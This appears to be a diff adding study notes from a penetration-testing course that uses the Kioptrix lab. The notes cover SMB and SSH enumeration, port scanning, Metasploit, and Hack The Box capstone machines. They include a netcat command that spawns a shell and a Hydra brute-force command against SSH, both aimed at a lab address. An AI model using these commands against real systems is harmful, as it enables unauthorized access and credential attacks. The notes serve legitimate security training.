@@ -692,22 +692,128 @@ https://medium.com/@obikag/how-to-get-kioptrix-working-on-virtualbox-an-oscp-sto
 
 * **Dirbuster**
 
-  
-
-
 * **gobuster**
 
 * **dirb**
 
+### Enumerating SMB
+
+**metasploit**
+
+```msfconsole ```
+
+
+**smbclient**
+
+```smbclient -L \\\\192.168.57.134\\ ```
+
+  * -L this flag is used for listing files 
+
+```smbclient  \\\\192.168.57.134\\ADMIN$ ```
+
+
+### Enumerating SSH
+
+
+```ssh 192.168.57.134 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc ```
+
+
+### Researching Potential Vulnerabilities
+
+**searchsploit**
+
+```searchsploit samba 2.2 ```
+
+## Additional Scanning Tools
+
+
+### Scanning with Masscan
+
+* really fast port scanner
+
+```masscan -p1-65535 --rate 1000 192.168.57.134 ```
+
+### Scanning with Metasploit
+
+
+```portscan ```
+
+```use portscan/syn ```
+
+### Scanning with Nessus 
+
+* it is a vulnerability scanner
+
+
+## Exploitation Basics
+
+### Reverse Shells vs Bind Shells
+
+
+* reverse shell means : a victim connect to us
+* **netcat reverse shell**
+
+  ```nc -nlvp 4444 ```
+ 
+  ``` nc -nlvp 4444 -e /bin/sh ```
+  
+* in bind shell : we connect to the target 
+
+### Staged vs Non-Staged Payloads
+
+non -staged | staged
+------------|-------
+send exploit shellcode all at once | sends payload in stages
+Larger in size and won't always work | can be less stable
+eg: windows/meterpreter_reverse_tcp  | windows/meterpreter/reverse_tcp
+
+
+### Gaining Root with Metasploit
+
+### Manual Exploitation
+
+### Brute Force Attacks
+
+* **Hydra**
+  
+  ```hydra -l root -P /usr/share/wordlist/rockyou.txt ssh://192.168.57.134:22 -t 4 -V ```
+  
+ * **metasploit**
+ 
+  ``` scanner/ssh/ssh_login ```
+  
+
+### Credential Spraying and Password Stuffing
+
+* use intruder of burpsuite
 
 
 
+## Mid-Course Capstone
+ 
+* Legacy (34:19)
+ 
+* Lame (29:47)
 
+  * Cracking Hashes with Hashcat: https://youtu.be/eq097dEB8Sw
+ 
+* Blue (29:56)
+ 
+* Devel (28:42)
+ 
+* Jerry (34:02)
+ 
+* Nibbles (31:20)
+ 
+* Optimum (28:30)
+ 
+* Bashed (30:16)
+ 
+* Grandpa (14:31)
+ 
+* Netmon (25:49)
 
-
-
-
-
+## Introduction to Exploit Development (Buffer Overflows)
 
 
 
